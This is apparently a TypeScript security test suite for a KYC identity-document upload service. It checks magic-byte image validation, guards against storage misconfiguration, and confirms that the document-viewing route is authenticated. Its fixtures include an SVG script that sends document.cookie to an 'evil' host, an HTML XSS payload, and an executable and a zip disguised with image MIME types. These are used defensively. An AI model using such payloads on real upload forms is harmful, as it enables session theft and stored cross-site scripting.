/**
 * D2 · KYC DOCUMENTS — the bytes must be an image, and they must go where the
 * operator said they go.
 *
 * ⚠️ TWO THINGS THIS SUITE EXISTS FOR.
 *
 * 1 · MAGIC BYTES. The upload path used to trust the mime written in the data URL
 *     — a string the CLIENT supplies. Driven with real files, ALL of these were
 *     accepted and stored as a citizen's identity document:
 *       · a Windows executable (real PE `MZ` header) labelled image/jpeg
 *       · an SVG carrying <script>fetch('https://evil/'+document.cookie)</script>
 *       · the outer bytes of a zip, labelled image/webp
 *       · raw HTML with a <script> tag, labelled image/jpeg
 *     The pre-existing suite could not have caught this: its own "valid jpeg"
 *     fixture was the letter 'a' repeated 2048 times. A fixture that lies makes
 *     every assertion above it meaningless.
 *
 * 2 · 🔴 STORAGE MODE CANNOT DEGRADE IN SILENCE. `kycStorageMode()` returns "r2"
 *     only when KYC_STORAGE=r2 **and** R2_BUCKET is non-empty. If the bucket var
 *     is missing or a rolled credential is not mirrored into Railway, the seam
 *     quietly answers "inline" and writes base64 ID photographs into Postgres —
 *     no throw, no log, no alert. That has already happened once: rolling the R2
 *     token broke KYC storage on production and nothing reported it.
 *     Measured on production 2026-07-31: 31 documents, 24 inline (11.00 MB of
 *     base64 in the DB, ~83% of every nightly backup), 7 in R2. The inline rows
 *     are LEGACY — all 24 were uploaded 2026-06-13..15, all 7 R2 rows
 *     2026-07-27..28, with no interleaving — so this is not a live regression.
 *     "Make sure new ones are correct" still has to be CODE, not a promise.
 *
 * Every negative assertion below has been broken on purpose and observed red.
 */
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { validateDocImage } from "../src/lib/server/kyc-service.ts";
import { sniffImageMime, sniffBase64ImageMime } from "../src/lib/server/image-signature.ts";
import { kycStorageMode, assertStorageModeIntended } from "../src/lib/server/storage.ts";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const read = (p: string) => readFileSync(join(root, p), "utf8");
const stripComments = (s: string) =>
  s.replace(/\/\*[\s\S]*?\*\//g, "").replace(/(^|[^:])\/\/.*$/gm, "$1");

let pass = 0, fail = 0;
const ok = (label: string, cond: boolean, extra?: string) => {
  if (cond) { pass++; } else { fail++; console.log(`FAIL ${label}${extra ? `\n       ${extra}` : ""}`); }
};
const section = (s: string) => console.log(`\n── ${s} ${"─".repeat(Math.max(0, 58 - s.length))}`);

// ── 1 · Magic bytes, driven with real hostile files ──────────────────────────────────────────
section("1 · a document must actually BE an image");

const dataUrl = (mime: string, b: Buffer) => `data:${mime};base64,${b.toString("base64")}`;
const JPEG = Buffer.concat([
  Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]),
  Buffer.alloc(512, 0x61)]);
const PNG = Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(512, 0x61)]);
const WEBP = Buffer.concat([
  Buffer.from("RIFF"), Buffer.from([0, 0, 0, 0]), Buffer.from("WEBP"), Buffer.alloc(512, 0x61)]);
const EXE = Buffer.concat([Buffer.from("MZ\x90\x00\x03\x00\x00\x00", "binary"), Buffer.alloc(512, 0x41)]);
const SVG = Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('https://evil/'+document.cookie)</script></svg>`);
const ZIP = Buffer.concat([Buffer.from("PK\x03\x04", "binary"), Buffer.alloc(512, 0)]);
const HTML = Buffer.from(`<html><script>alert(document.domain)</script></html>`);

// Controls: the three real formats must still be accepted, or we have broken uploads.
ok("a real JPEG is accepted", validateDocImage(dataUrl("image/jpeg", JPEG)).ok);
ok("a real PNG is accepted", validateDocImage(dataUrl("image/png", PNG)).ok);
ok("a real WebP is accepted", validateDocImage(dataUrl("image/webp", WEBP)).ok);

const HOSTILE: Array<[string, string]> = [
  ["🔴 a Windows executable labelled image/jpeg", dataUrl("image/jpeg", EXE)],
  ["🔴 an SVG carrying <script> labelled image/png", dataUrl("image/png", SVG)],
  ["🔴 a zip labelled image/webp", dataUrl("image/webp", ZIP)],
  ["🔴 raw HTML with a <script> labelled image/jpeg", dataUrl("image/jpeg", HTML)],
];
for (const [label, url] of HOSTILE) {
  ok(`${label} is refused`, !validateDocImage(url).ok,
    "The declared mime is attacker-controlled. Identify the format from the BYTES.\n" +
    "       A KYC document that is not an image is not evidence — an officer approving\n" +
    "       against it has approved against nothing.");
}

// A mime that is real but MISLABELLED must also fail: a PNG sent as image/jpeg.
ok("🔴 a real PNG mislabelled image/jpeg is refused",
  !validateDocImage(dataUrl("image/jpeg", PNG)).ok,
  "Otherwise the stored Content-Type disagrees with the bytes it describes.");

ok("the accepted mime reported is the SNIFFED one",
  (() => { const r = validateDocImage(dataUrl("image/png", PNG)); return r.ok && r.mimeType === "image/png"; })());

ok("size is still bounded",
  !validateDocImage(dataUrl("image/jpeg", Buffer.concat([JPEG, Buffer.alloc(4 * 1024 * 1024, 0x61)]))).ok,
  "A 100 MB upload must not reach storage.");

// The sniffer itself, at the boundary.
ok("sniffer rejects a truncated signature", sniffImageMime(Buffer.from([0xff, 0xd8])) === null);
ok("sniffer rejects an empty buffer", sniffImageMime(Buffer.alloc(0)) === null);
ok("sniffer identifies from base64 without decoding the whole payload",
  sniffBase64ImageMime(JPEG.toString("base64")) === "image/jpeg");
ok("🔴 sniffer is not fooled by RIFF that is not WEBP (e.g. a .wav)",
  sniffImageMime(Buffer.concat([Buffer.from("RIFF"), Buffer.from([0, 0, 0, 0]), Buffer.from("WAVE"), Buffer.alloc(8)])) === null);

// ── 2 · The upload path actually uses the check ──────────────────────────────────────────────
section("2 · the check is wired into the write path");

const svc = stripComments(read("src/lib/server/kyc-service.ts"));
ok("validateDocImage sniffs rather than trusting the label",
  /sniffBase64ImageMime\(/.test(svc));
ok("both document write paths validate before storing",
  (svc.match(/validateDocImage\(/g) ?? []).length >= 2,
  "attachDocument AND attachExtraDocument — an officer-requested extra document is\n" +
  "       the same class of file and reaches the same bucket.");
ok("🔴 the verified mime + size are persisted, not re-guessed from the key",
  /mimeType: valid\.mimeType/.test(svc) && /sizeBytes: valid\.bytes/.test(svc),
  "An `r2:<key>` cannot be measured. The DAL used to regex it as a data URL and\n" +
  "       recorded application/octet-stream / 0 bytes for EVERY R2 document.");
const dal = stripComments(read("src/lib/server/prisma-dal.ts"));
ok("the DAL prefers the captured facts over the derived ones",
  /mimeType: d\.mimeType \?\?/.test(dal) && /sizeBytes: d\.sizeBytes \?\?/.test(dal));

// ── 3 · 🔴 Storage mode cannot degrade silently ───────────────────────────────────────────────
section("3 · inline-while-r2 is impossible, not merely unlikely");

const storage = read("src/lib/server/storage.ts");
const storageCode = stripComments(storage);
ok("storage still exposes the mode as one helper", /export function kycStorageMode/.test(storageCode));

// ⚠️ Asserting that the string `assertStorageModeIntended` merely APPEARS in the
// file matches its own DEFINITION — commenting out the CALL left this green.
// Slice the write function's body (the definition sits above it) and require the
// assertion to run BEFORE the inline early-return.
const iPut = storageCode.indexOf("export async function putKycDocument");
const putBody = iPut >= 0 ? storageCode.slice(iPut, iPut + 800) : "";
const iAssert = putBody.indexOf("assertStorageModeIntended(");
const iInlineReturn = putBody.indexOf("return dataUrl");
ok("putKycDocument exists and has an inline early-return", iPut >= 0 && iInlineReturn >= 0);
ok("🔴 an INTENDED r2 mode that resolves to inline throws BEFORE any inline write",
  iAssert >= 0 && iInlineReturn >= 0 && iAssert < iInlineReturn,
  "Without this, a missing R2_BUCKET (or a rolled credential not mirrored into\n" +
  "       Railway) silently reverts to writing ID photographs into Postgres. That has\n" +
  "       already happened once and nothing reported it.");

// Drive the real function across the four env combinations.
const envSnapshot = { KYC_STORAGE: process.env.KYC_STORAGE, R2_BUCKET: process.env.R2_BUCKET };
const withEnv = (kyc: string | undefined, bucket: string | undefined, f: () => void) => {
  if (kyc === undefined) delete process.env.KYC_STORAGE; else process.env.KYC_STORAGE = kyc;
  if (bucket === undefined) delete process.env.R2_BUCKET; else process.env.R2_BUCKET = bucket;
  try { f(); } finally {
    if (envSnapshot.KYC_STORAGE === undefined) delete process.env.KYC_STORAGE; else process.env.KYC_STORAGE = envSnapshot.KYC_STORAGE;
    if (envSnapshot.R2_BUCKET === undefined) delete process.env.R2_BUCKET; else process.env.R2_BUCKET = envSnapshot.R2_BUCKET;
  }
};

withEnv(undefined, undefined, () => {
  ok("no KYC_STORAGE → inline, and that is a legitimate intent", kycStorageMode() === "inline");
  ok("…so nothing throws", (() => { try { assertStorageModeIntended(); return true; } catch { return false; } })());
});
withEnv("r2", "50pick-kyc", () => {
  ok("KYC_STORAGE=r2 + a bucket → r2", kycStorageMode() === "r2");
  ok("…and nothing throws", (() => { try { assertStorageModeIntended(); return true; } catch { return false; } })());
});
withEnv("r2", undefined, () => {
  ok("🔴 KYC_STORAGE=r2 with NO bucket is a MISCONFIGURATION, not a fallback",
    (() => { try { assertStorageModeIntended(); return false; } catch { return true; } })(),
    "This is the exact shape of the outage that already happened. Refusing the write\n" +
    "       keeps the ID photograph out of Postgres and out of every nightly backup;\n" +
    "       the player retries, and the operator sees a real error instead of silence.");
});
withEnv("r2", "", () => {
  ok("🔴 an EMPTY bucket string is treated the same way",
    (() => { try { assertStorageModeIntended(); return false; } catch { return true; } })());
});

// ── 4 · Documents are never served to the unauthenticated ────────────────────────────────────
section("4 · the document route is gated before it reads bytes");

const routeSrc = read("src/app/api/admin/kyc-doc/route.ts");
const route = stripComments(routeSrc);
const iSession = route.indexOf("currentSession(");
const iRead = route.indexOf("readKycDocument(");
ok("the route authenticates and reads a document", iSession >= 0 && iRead >= 0);
ok("🔴 authentication happens BEFORE any document is read",
  iSession >= 0 && iRead >= 0 && iSession < iRead,
  "Both indexes are checked for presence first: indexOf(missing) is -1, which would\n" +
  "       compare as 'first' and let this assertion pass over deleted code.");
ok("a role/domain check gates it", /canAct\(|role === "ADMIN"/.test(route));
ok("a TOTP step-up gates it", /checkAdminTotp\(/.test(route));
// ⚠️ An earlier draft asserted `/nosniff/` alone. Renaming the HEADER to
// X-Disabled-Header left the VALUE "nosniff" in the file and the gate stayed
// green while the protection was gone. Assert the header AND its value together.
ok("responses are not cacheable",
  /Cache-Control["'\s:,]+[^\n]*no-store/.test(route),
  "These bytes are a citizen's identity document.");
ok("🔴 responses carry X-Content-Type-Options: nosniff",
  /X-Content-Type-Options["'\s:,]+["']nosniff["']/.test(route),
  "Without it a browser may re-interpret stored bytes as another type.");
ok("every view is audited", /kyc_doc\.viewed/.test(route));
ok("the object key is never taken from the request",
  !/searchParams\.get\("key"\)|params\.key/.test(route),
  "The route looks the document up server-side by (userId, docType) — there is no\n" +
  "       client-supplied path to traverse.");

console.log("");
console.log("─".repeat(64));
console.log(`  D2 · KYC DOCUMENTS: ${pass} passed, ${fail} failed`);
console.log(`  Production 2026-07-31: 31 documents · 24 inline (legacy, 06-13..15)`);
console.log(`  · 7 in R2 (07-27..28). No interleaving — the seam did not regress.`);
console.log("─".repeat(64));

if (fail > 0) process.exit(1);
